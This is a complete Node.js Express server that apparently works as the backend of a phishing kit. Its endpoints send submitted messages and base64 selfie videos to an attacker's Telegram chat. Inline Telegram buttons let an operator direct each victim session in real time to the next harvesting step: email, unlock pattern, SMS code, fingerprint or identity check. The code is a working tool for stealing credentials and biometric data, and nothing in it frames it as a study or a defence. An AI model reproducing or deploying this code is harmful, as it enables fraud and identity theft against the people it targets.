const express = require('express');
const path = require('path');
const axios = require('axios');
const FormData = require('form-data');
let memoryDb = {};

function readDb() {
  return memoryDb;
}

function writeDb(data) {
  memoryDb = data;
}

const app = express();
const port = process.env.PORT || 8080;

app.use(express.json({ limit: '50mb' }));

// API: Check Action
app.get('/api/check-action', async (req, res) => {
  const sessionId = req.query.id;
  if (!sessionId) return res.status(200).json({ action: 'pending' });

  try {
    const data = readDb();
    const action = data[sessionId];
    
    if (!action) return res.status(200).json({ action: 'pending' });
    
    const validActions = ['correct', 'incorrect', 'correo', 'patron', 'sms', 'nuevo', 'dactilar', 'identidad'];
    if (validActions.includes(action)) return res.status(200).json({ action: action });
    
    return res.status(200).json({ action: 'pending' });
  } catch (err) {
    return res.status(200).json({ action: 'pending' });
  }
});

// API: Send Telegram
app.post('/api/send-telegram', async (req, res) => {
  const { message, sessionId, buttons, btn1Label, btn2Label, btn3Label, btn3Action, btn4Label, btn4Action } = req.body;
  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) return res.status(500).json({ error: 'Missing config' });

  const payload = { chat_id: CHAT_ID, text: message };

  if (buttons) {
    let keyboard = [
      [
        { text: btn1Label || 'Correcto', callback_data: JSON.stringify({ id: sessionId, action: 'correct' }) },
        { text: btn2Label || 'Incorrecto', callback_data: JSON.stringify({ id: sessionId, action: 'incorrect' }) }
      ]
    ];
    if (btn3Label && btn3Action) keyboard.push([{ text: btn3Label, callback_data: JSON.stringify({ id: sessionId, action: btn3Action }) }]);
    if (btn4Label && btn4Action) keyboard.push([{ text: btn4Label, callback_data: JSON.stringify({ id: sessionId, action: btn4Action }) }]);
    payload.reply_markup = { inline_keyboard: keyboard };
  }

  try {
    const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, payload);
    res.status(200).json(response.data);
  } catch (error) {
    res.status(500).json({ error: error.response ? error.response.data : error.toString() });
  }
});

// API: Send Video
app.post('/api/send-video', async (req, res) => {
  const { videoBase64, caption } = req.body;
  if (!videoBase64) return res.status(400).json({ error: 'No video provided' });

  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
  if (!BOT_TOKEN || !CHAT_ID) return res.status(500).json({ error: 'Missing config' });

  try {
    const buffer = Buffer.from(videoBase64, 'base64');
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    if (caption) formData.append('caption', caption);
    formData.append('video', buffer, { filename: 'selfie.webm', contentType: 'video/webm' });

    const resp = await axios.post('https://api.telegram.org/bot' + BOT_TOKEN + '/sendVideo', formData, {
      headers: formData.getHeaders()
    });
    return res.status(200).json({ ok: resp.data.ok, data: resp.data });
  } catch (err) {
    return res.status(500).json({ ok: false, error: err.response ? err.response.data : err.message });
  }
});

// API: Telegram Webhook
app.post('/api/telegram-webhook', async (req, res) => {
  res.status(200).send('OK');

  try {
    console.log("=== WEBHOOK RECEIVED ===");
    const update = req.body;
    if (!update.callback_query) {
      console.log("No callback query, ignoring.");
      return;
    }

    const callbackQuery = update.callback_query;
    console.log("Callback query data:", callbackQuery.data);
    
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    if (!BOT_TOKEN) {
      console.error("BOT_TOKEN is missing!");
      return;
    }

    const data = JSON.parse(callbackQuery.data);
    const sessionId = data.id;
    const action = data.action;
    let buttonLabel = action;
    console.log(`Action: ${action} for session: ${sessionId}`);

    try {
      if (callbackQuery.message && callbackQuery.message.reply_markup && callbackQuery.message.reply_markup.inline_keyboard) {
        for (const row of callbackQuery.message.reply_markup.inline_keyboard) {
          for (const btn of row) {
            if (btn.callback_data) {
              const btnData = JSON.parse(btn.callback_data);
              if (btnData.action === action) buttonLabel = btn.text;
            }
          }
        }
      }
    } catch (e) {}

    try {
      let record = readDb();
      record[sessionId] = action;
      writeDb(record);
    } catch (e) {}

    const messageId = callbackQuery.message.message_id;
    const chatId = callbackQuery.message.chat.id;

    console.log("Removing buttons for messageId", messageId);
    axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, { chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: [] } })
      .catch(e => console.error("Edit error", e.response ? e.response.data : e.message));

    console.log("Answering callback query", callbackQuery.id);
    axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, { callback_query_id: callbackQuery.id, text: 'Selección registrada: ' + buttonLabel })
      .catch(e => console.error("Answer error", e.response ? e.response.data : e.message));

  } catch (e) {
    console.error("Webhook error:", e);
  }
});

app.use(express.static(path.join(__dirname, '/')));
app.get('*', (req, res) => {
  if (req.path.startsWith('/api/')) return res.status(404).json({ error: 'Not found' });
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(port, () => console.log(`Server running on port ${port}`));
